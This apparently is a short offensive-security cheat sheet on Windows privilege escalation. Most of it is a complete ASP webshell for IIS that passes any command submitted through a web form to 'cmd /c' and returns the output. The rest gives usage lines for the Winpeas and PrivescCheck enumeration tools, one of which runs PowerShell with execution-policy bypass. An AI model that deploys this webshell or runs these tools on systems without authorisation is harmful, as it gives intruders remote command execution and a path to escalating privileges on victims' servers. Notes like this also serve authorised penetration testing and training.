# Privilege Escalation

## IIS Webshell

webshell.asp

```asp
#Webshell
<%
Function getResult(theParam)
    Dim objSh, objResult
    Set objSh = CreateObject("WScript.Shell")
    Set objResult = objSh.exec(theParam)
    getResult = objResult.StdOut.ReadAll
end Function
%>
<HTML>
    <BODY>
        Enter command:
            <FORM action="" method="POST">
                <input type="text" name="param" size=45 value="<%= myValue %>">
                <input type="submit" value="Run">
            </FORM>
            <p>
        Result :
        <% 
        myValue = request("param")
        thisDir = getResult("cmd /c" & myValue)
        Response.Write(thisDir)
        %>
        </p>
        <br>
    </BODY>
</HTML>
```

## Tools

### Winpeas

```powershell
.\winpeas.exe cmd > winpeas.txt
```

### PrivescCheck

- https://github.com/itm4n/PrivescCheck

```
. .\PrivescCheck.ps1; Invoke-PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,CSV,HTML,XML"
```